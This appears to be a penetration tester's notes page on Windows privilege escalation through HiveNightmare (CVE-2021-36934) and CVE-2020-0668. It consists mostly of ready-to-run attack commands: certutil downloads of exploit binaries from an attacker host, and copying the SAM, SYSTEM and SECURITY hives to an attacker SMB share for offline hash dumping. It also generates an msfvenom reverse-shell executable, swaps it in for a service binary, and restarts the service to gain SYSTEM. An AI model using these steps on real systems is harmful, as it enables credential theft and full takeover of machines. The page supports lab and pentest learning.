---
Primary_category: "[[WINDOWS PRIVESC]]"
title: WINDOWS KERNEL ABUSE
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WINDOWS PRIVESC]]

#### *Enumeration*

##### *Listing Installed Updates*

> ***CMD & PS***

```bash
systeminfo
wmic qfe list brief
```

> ***PS***

```bash
Get-Hotfix
Get-CimInstance -ClassName win32_quickfixengineering -Property *
```

##### *Getting Information about an specific KB*

> ***[Microsoft Update Catalog](https://www.catalog.update.microsoft.com/Search.aspx)***

---

#### *HiveNightmare ( a.k.a SeriousSam )*

> ***[CVE-2021-36934](https://nvd.nist.gov/vuln/detail/cve-2021-36934)***

##### *Workflow*

This is a really simple security flaw which allows any authenticated user to have *READ* permissions over the entire *Windows* registry, therefore having access to sensitive information, such as the one contained within both ***[[SAM & SECURITY#SAM|SAM]]*** and ***[[SAM & SECURITY#Security (LSA Secrets)|SECURITY]]*** hives

As is well known, those sensitive files are locked out by the system, so even if there is a *DACL*  misconfiguration that grants *READ* privileges to the *BUILTIN\Users* group, they can be read

However, an operator could leverage the *VSS Volume Shadow Copy ( System Protection )* in order to retrieve a copy of those files and then proceed with an offline data extraction

##### *Requirements*

- ***The Windows System must be vulnerable***

> ***Windows 10 1809 build and higher***

- ***System Protection Feature Enabled ( VSS Copies )***

- ***Presence of at least one Restoration Checkpoint***

##### *Abuse - Windows*

###### *Checking Permissions on Sensitive Files*

> ***CMD & PS***

```bash
icacls 'C:\Windows\System32\config\SAM'
icacls 'C:\Windows\System32\config\SECURITY'
icacls 'C:\Windows\System32\config\SYSTEM'
```

> ***PS***

```bash
Get-Item 'C:\Windows\System32\config\SAM', 'C:\Windows\System32\config\SECURITY', 'C:\Windows\System32\config\SYSTEM' | Get-ACL | Select -ExpandProperty accessToString
```

###### *Retrieving Sensitive Files from VSS Copy carried out by System Protection*

> ***[HiveNightmare](https://github.com/GossiTheDog/HiveNightmare)***

- ***Setup***

***Downloading the script***

> ***From the attacker*** ⚔️

```bash
curl --silent --location --request GET --remote-name 'https://github.com/GossiTheDog/HiveNightmare/releases/download/0.6/HiveNightmare.exe'
```

***Transferring it to the target***

> ***From the attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the target*** 🎯

```bash
mkdir C:\Windows\Temp\LPE
cd C:\Windows\Temp\LPE
```

```bash
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/HiveNightmare.exe'
```

- ***Usage***

```bash
.\HiveNightmare.exe
```

###### *Transferring copies of sensitives files to the attacker*

> ***From the attacker*** ⚔️

```bash
smbserver.py -smb2support -user '<USER>' -password '<PASSWD>' '<SHARE_NAME>' '<LOCAL_PATH>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> smbserver.py -smb2support -user '4l3xbb' -password '4l3xbb' 'smbFolder' "$( pwd )"
> ```
>

> ***From the target*** 🎯

```bash
net use X: \\<ATTACKER_IP>\<SHARE> /USER:<USER> '<PASSWD>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> net use X: \\10.10.15.63\smbFolder /USER:4l3xbb '4l3xbb'
> ```
>

```bash
Copy-Item -Path '.\SAM-<YYYY-MM-DD>', '.\SYSTEM-<YYYY-MM-DD>', '.\SECURITY-<YYYY-MM-DD>' -Destination 'X:\'
```

###### *Offline Hash Extraction*

> ***From the attacker*** ⚔️

> ***[Impacket's Secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)***

```bash
secretsdump.py -sam ./SAM-<YYYY-MM-DD> -system .\SYSTEM-<YYYY-MM-DD> -security ./SECURITY-<YYYY-MM-DD> LOCAL
```

---

#### *PrintNightmare*

> ***[CVE-2021-1675](https://nvd.nist.gov/vuln/detail/cve-2021-1675)***

> ***[CVE-2021-34527](https://nvd.nist.gov/vuln/detail/cve-2021-34527)***

***See [[PRINTNIGHTMARE#Code Execution as LOCAL SYSTEM|PrintNightmare: Code Execution as LOCAL SYSTEM]]***

---

#### *CVE-2020-0668 + Service Abuse*

> ***[CVE-2020-0668](https://nvd.nist.gov/vuln/detail/CVE-2020-0668)***

> ***[[WINDOWS SERVICES WEAK PERMISSIONS ABUSE|Windows Service Abuse]]***

##### *Workflow*

The *CVE-2020-0668* corresponds to a security flaw in the *Windows Service Tracing* that can be leveraged to perform a privileged file move or rename operation carried out by *LOCAL SYSTEM*

This vulnerability alone does not allow an operator to gain code execution as *LOCAL SYSTEM*. However, we can chain it with another security flaw, misconfiguration or attack vector to achieve system compromise

In this case, we can look for any existing service in the given system that runs as *LOCAL SYSTEM* and for which an non-privileged user has the permissions to restart it. Therefore, we can leverage *CVE-2020-0668* to replace the defined executable in the *binPath* property of the service in question

So first, we use *CVE-2020-0668* to give us *FULL CONTROL* over the service's executable by replacing the legitimate binary with a binary we upload to the target previously

Since we have *FULL CONTROL* over it, now we have permissions to replace that binary with another malicious binary, so when we restart the service, we will gain code execution as *LOCAL SYSTEM*

##### *Requirements*

- ***The Windows target must be vulnerable to CVE-2020-0668***

> ***Windows 10 build ( 1607, 1709, 1803, 1809, 1903 and  1909 ) and lower ( e.g. W7, W8.1, WS{2008, 2012, 2016}***

- ***The controlled user account must be able to restart the service running as LOCAL SYSTEM***

##### *Abuse - Windows*

###### *Listing system services for which the current user has WRITE privileges*

First, we must look for any system service for which our current user has the following rights

- ***SERVICE_START***
- ***SERVICE_STOP***

To do so, we can use the ***[Sysinternal's accesschk.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)*** tool

- ***Setup***

***Downloading the tool***

> ***From the attacker*** ⚔️

```bash
curl --silent --location --request GET --remote-name 'https://live.sysinternals.com/accesschk.exe'
```

***Transferring it to the target***

> ***From the attacker*** ⚔️

```bash
python -m http.server 80
```

> ***From the target*** 🎯

```bash
mkdir C:\Windows\Temp\LPE
cd C:\Windows\Temp\LPE
```

```bash
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/accesschk.exe'
```

- ***Usage***

```bash
cmd.exe /c C:\Windows\Temp\LPE\accesschk.exe /accepteula -uwcqv "%USERDOMAIN%\%USERNAME%" *
```

###### *Verifying if the given service is running as LOCAL SYSTEM*

> ***CMD & PS***

```bash
sc.exe qc '<SERVICE_NAME>'
```

> ***PS***

```bash
Get-CIMInstance -ClassName win32_service -Filter 'name="<SERVICE_NAME>"' | Select -ExpandProperty startName
```

###### *Listing the binPath of the service*

> ***CMD & PS***

```bash
sc.exe qc '<SERVICE_NAME>'
```

> ***PS***

```bash
Get-CIMInstance -ClassName win32_service -Filter 'name="<SERVICE_NAME>"' | Select -ExpandProperty pathName
```

###### *Backing up the binPath's legitimate executable*

```bash
Copy-Item -Force -Path '<LEGITIMATE_BINARY_PATH>' -Destination 'C:\Windows\Temp\LPE\<BINARY>.exe.bk'
```

###### *Malicious Binary Setup*

- ***Creating the malicious binary***

> ***From the attacker*** ⚔️

```bash
msfvenom --payload windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> --arch x64 --platform windows --format exe --out <MALICIOUS>.exe
```

> [!DANGER]- *e.g.*
>
> ```bash
> msfvenom --payload windows/x64/shell_reverse_tcp LHOST=10.10.15.63 LPORT=443 --arch x64 --platform windows --format exe --out rev.exe
> ```
>

- ***Transferring it to the target***

> ***From the attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the target*** 🎯

```bash
mkdir C:\Windows\Temp\LPE
cd C:\Windows\Temp\LPE
```

```bash
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/<MALICIOUS>.exe'
```

> [!DANGER]- *e.g.*
>
> ```bash
> certutil.exe -urlcache -split -f 'http://10.10.15.63/rev.exe'
> ```
>

###### *Backing up our malicious binary*

Since our binary will become obsolete and non-functional after running the exploit below, we need to make a copy of it so we can replace it with that copy when we get *FULL CONTROL*

```bash
Copy-Item -Force -Path 'C:\Windows\Temp\LPE\<MALICIOUS>.exe' -Destination 'C:\Windows\Temp\LPE\<MALICIOUS>.exe.bk'
```

> [!DANGER]- *e.g.*
>
> ```bash
> Copy-Item -Force -Path 'C:\Windows\Temp\LPE\rev.exe' -Destination 'C:\Windows\Temp\LPE\rev.exe.bk'
> ```
>

###### *Exploit Setup*

> ***[CVE-2020-0668](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668)***

- ***Downloading the exploit and its dependencies ( DLL )***

> ***From the attacker*** ⚔️

```bash
curl --silent --location --request GET --remote-name 'https://github.com/bypazs/CVE-2020-0668.exe/raw/refs/heads/main/CVE-2020-0668.exe'
```

```bash
curl --silent --location --request GET --remote-name 'https://github.com/bypazs/CVE-2020-0668.exe/raw/refs/heads/main/NtApiDotNet.dll'
```

- ***Transferring them to the target***

> ***From the attacker*** ⚔️

```bash
python -m http.server 80
```

> ***From the target*** 🎯

```bash
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/CVE-2020-0668.exe'
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/NtApiDotNet.dll'
```

> [!DANGER]- *e.g.*
>
> ```bash
> certutil.exe -urlcache -split -f 'http://10.10.15.63/CVE-2020-0668.exe'
> certutil.exe -urlcache -split -f 'http://10.10.15.63/NtApiDotNet.dll'
> ```
>

###### *Running the exploit*

```bash
.\CVE-2020-0668.exe '<MALICIOUS_BINARY>' '<LEGITIMATE_BINARY>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> .\CVE-2020-0668.exe 'C:\Windows\Temp\LPE\rev.exe' 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'
> ```
>

> [!NOTE]- *Command Output*
>
> ```bash
> [+] Moving C:\Windows\Temp\LPE\rev.exe to C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
> [+] Mounting \RPC Control onto C:\Users\htb-student\AppData\Local\Temp\rlhdx1of.iuv
> [+] Creating symbol links
> [+] Updating the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Tracing\RASPLAP configuration.
> [+] Sleeping for 5 seconds so the changes take effect
> [+] Writing phonebook file to C:\Users\htb-student\AppData\Local\Temp\86346fa0-1b57-4cdf-a3a7-e5566ca913c7.pbk
> [+] Cleaning up
> [+] Done!
> ```
>

###### *Verifying permissions on the malicious binary*

As stated, once we run the exploit above, the service's *binPath* will be our binary's path

So, we can check its permissions to see if we have *FULL CONTROL* over it

> ***CMD & PS***

```bash
icacls '<SERVICE_BINPATH>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'
> ```
>

> ***PS***

```bash
Get-ACL '<SERVICE_BINPATH>' | Select -ExpandProperty accessToString
```

###### *Replacing the corrupted binary with a copy of it*

As we mentioned ***[[#Backing up our malicious binary|here]]*** before, we have to replace the current malicious binary, as it is corrupted after running the *CVE-2020-0668* exploit, with a working copy, which we have done previously

To do so, proceed as follows

```bash
Copy-Item -Force -Path 'C:\Windows\Temp\LPE\<MALICIOUS>.exe.bk' -Destination '<SERVICE_BINPATH>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> Copy-Item -Force -Path 'C:\Windows\Temp\LPE\rev.exe.bk' -Destination 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'
> ```
>

###### *Setting up a Netcat Listener for the Rev. Shell*

> ***[Netcat](https://linux.die.net/man/1/nc)***

```bash
rlwrap -CaR nc -nlvp <PORT>
```

###### *Restarting the service*

All that remains is to restart the service in order to gain code execution as *LOCAL SYSTEM*

```bash
sc.exe stop '<SERVICE_NAME>'
sc.exe start '<SERVICE_NAME>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> sc.exe stop 'MozillaMaintenance '
> sc.exe start 'MozillaMaintenance '
> ```
>

---
#### *Resources*

***[Microsoft Update Guide](https://msrc.microsoft.com/update-guide/vulnerability)***